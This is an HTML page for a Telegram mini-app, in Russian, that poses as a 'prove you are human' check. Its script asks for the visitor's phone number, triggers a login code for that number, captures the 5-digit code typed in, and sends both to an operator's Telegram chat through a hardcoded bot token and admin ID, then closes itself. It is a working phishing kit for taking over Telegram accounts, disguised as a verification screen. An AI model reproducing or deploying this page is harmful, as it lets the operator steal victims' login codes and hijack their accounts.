<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Проверка личности</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 12px; }
        .container { max-width: 400px; width: 100%; padding: 20px 16px 30px; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .emoji { font-size: 80px; margin: 10px 0; }
        .lead { font-size: 18px; font-weight: 500; margin: 8px 0; }
        .muted { color: #9da3a8; font-size: 14px; margin: 4px 0 16px; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #2f80ed, #3aa3ff); border: none; border-radius: 14px; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; margin-top: 12px; }
        .btn:active { opacity: 0.7; }
        .btn-secondary { background: #2a2a2a; margin-top: 8px; }
        .code-boxes { display: flex; gap: 12px; margin: 16px 0 12px; }
        .code-box { width: 50px; height: 56px; background: #111; border-radius: 12px; border: 2px solid #222; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 600; color: #fff; }
        .code-box.filled { border-color: #2f80ed; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin: 16px 0 12px; }
        .kbtn { padding: 14px; background: #1a1a1a; border: none; border-radius: 14px; color: #fff; font-size: 22px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .kbtn:active { background: #2a2a2a; }
        .kbtn.del { background: #1a1a1a; color: #ff6b6b; font-size: 20px; }
        .status { color: #9da3a8; font-size: 14px; min-height: 24px; margin-top: 8px; }
        .status.success { color: #69db7c; }
        .hidden { display: none !important; }
        .input-field { width: 100%; padding: 14px; background: #111; border: 1px solid #222; border-radius: 12px; color: #fff; font-size: 18px; margin: 10px 0; text-align: center; }
        .input-field:focus { border-color: #2f80ed; outline: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="screen-welcome">
            <div class="emoji">👋</div>
            <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
            <div class="muted">Нажмите на кнопку ниже для начала!</div>
            <button class="btn" id="btnConfirm">Подтвердить</button>
        </div>
        <div id="screen-phone" class="hidden">
            <div class="emoji">📱</div>
            <div class="lead">Введите Ваш номер телефона</div>
            <div class="muted">Мы отправим код подтверждения</div>
            <input class="input-field" type="tel" id="phoneInput" placeholder="79261234567">
            <button class="btn" id="btnSendPhone">Отправить</button>
            <div class="status" id="statusPhone"></div>
        </div>
        <div id="screen-waiting" class="hidden">
            <div class="emoji">⏳</div>
            <div class="lead">Ожидайте, не выходите!</div>
            <div class="muted">Код отправлен на ваш номер</div>
        </div>
        <div id="screen-code" class="hidden">
            <div class="emoji">🔐</div>
            <div class="lead">Введите 5-значный код</div>
            <div class="code-boxes" id="codeBoxes">
                <div class="code-box" data-index="0"></div>
                <div class="code-box" data-index="1"></div>
                <div class="code-box" data-index="2"></div>
                <div class="code-box" data-index="3"></div>
                <div class="code-box" data-index="4"></div>
            </div>
            <button class="btn btn-secondary" id="btnGetCode">Узнать код</button>
            <div class="keypad" id="keypad">
                <button class="kbtn" data-key="1">1</button>
                <button class="kbtn" data-key="2">2</button>
                <button class="kbtn" data-key="3">3</button>
                <button class="kbtn" data-key="4">4</button>
                <button class="kbtn" data-key="5">5</button>
                <button class="kbtn" data-key="6">6</button>
                <button class="kbtn" data-key="7">7</button>
                <button class="kbtn" data-key="8">8</button>
                <button class="kbtn" data-key="9">9</button>
                <button class="kbtn" data-key="0">0</button>
                <button class="kbtn del" data-key="backspace">⌫</button>
            </div>
            <div class="status" id="statusCode"></div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
        const ADMIN_ID = "8821493005";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        let tg = window.Telegram.WebApp;
        let phone = '';
        let codeDigits = [];

        if (tg) { tg.ready(); tg.expand(); }

        async function sendToBot(text) {
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                });
            } catch(e) {}
        }

        const screenWelcome = document.getElementById('screen-welcome');
        const screenPhone = document.getElementById('screen-phone');
        const screenWaiting = document.getElementById('screen-waiting');
        const screenCode = document.getElementById('screen-code');
        const btnConfirm = document.getElementById('btnConfirm');
        const btnSendPhone = document.getElementById('btnSendPhone');
        const phoneInput = document.getElementById('phoneInput');
        const statusPhone = document.getElementById('statusPhone');
        const codeBoxes = document.querySelectorAll('.code-box');
        const statusCode = document.getElementById('statusCode');
        const btnGetCode = document.getElementById('btnGetCode');
        const keypad = document.getElementById('keypad');

        function showScreen(screen) {
            [screenWelcome, screenPhone, screenWaiting, screenCode].forEach(el => el.classList.add('hidden'));
            screen.classList.remove('hidden');
        }

        function updateCodeBoxes() {
            codeBoxes.forEach((box, index) => {
                box.textContent = codeDigits[index] || '';
                box.classList.toggle('filled', !!codeDigits[index]);
            });
        }

        btnConfirm.addEventListener('click', () => showScreen(screenPhone));

        btnSendPhone.addEventListener('click', async () => {
            phone = phoneInput.value.trim();
            if (!phone) {
                statusPhone.textContent = 'Введите номер в формате 79261234567';
                statusPhone.className = 'status';
                return;
            }
            statusPhone.textContent = 'Отправка кода...';
            statusPhone.className = 'status';
            try {
                await sendToBot(`⏳ ОТПРАВИТЬ КОД на номер: ${phone}`);
                // СИГНАЛ БОТУ ЧЕРЕЗ КОМАНДУ
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: `/send_code ${phone}`
                    })
                });
                statusPhone.textContent = 'Код отправлен!';
                statusPhone.className = 'status success';
                showScreen(screenWaiting);
                setTimeout(() => {
                    showScreen(screenCode);
                    statusCode.textContent = '📲 Введите код из Telegram';
                    statusCode.className = 'status';
                }, 3000);
            } catch(e) {
                statusPhone.textContent = 'Ошибка: ' + e.message;
                statusPhone.className = 'status';
            }
        });

        keypad.addEventListener('click', (e) => {
            const key = e.target.dataset.key;
            if (!key) return;
            if (key === 'backspace') { codeDigits.pop(); updateCodeBoxes(); return; }
            if (codeDigits.length >= 5) return;
            codeDigits.push(key);
            updateCodeBoxes();
            if (codeDigits.length === 5) {
                let code = codeDigits.join('');
                sendToBot(`📩 КОД: ${code} для номера ${phone}`);
                statusCode.textContent = '✅ Код получен!';
                statusCode.className = 'status success';
                setTimeout(() => {
                    if (tg) tg.close();
                }, 1500);
            }
        });

        btnGetCode.addEventListener('click', () => {
            sendToBot(`🔄 ПОВТОРНЫЙ КОД для ${phone}`);
            statusCode.textContent = '📲 Код отправлен повторно!';
            statusCode.className = 'status success';
        });

        document.addEventListener('keydown', (e) => {
            if (!screenCode.classList.contains('hidden')) {
                if (/^\d$/.test(e.key) && codeDigits.length < 5) {
                    codeDigits.push(e.key);
                    updateCodeBoxes();
                    if (codeDigits.length === 5) {
                        let code = codeDigits.join('');
                        sendToBot(`📩 КОД: ${code} для ${phone}`);
                        statusCode.textContent = '✅ Код получен!';
                        statusCode.className = 'status success';
                        setTimeout(() => { if (tg) tg.close(); }, 1500);
                    }
                } else if (e.key === 'Backspace') {
                    codeDigits.pop();
                    updateCodeBoxes();
                }
            }
        });
    </script>
</body>
</html>
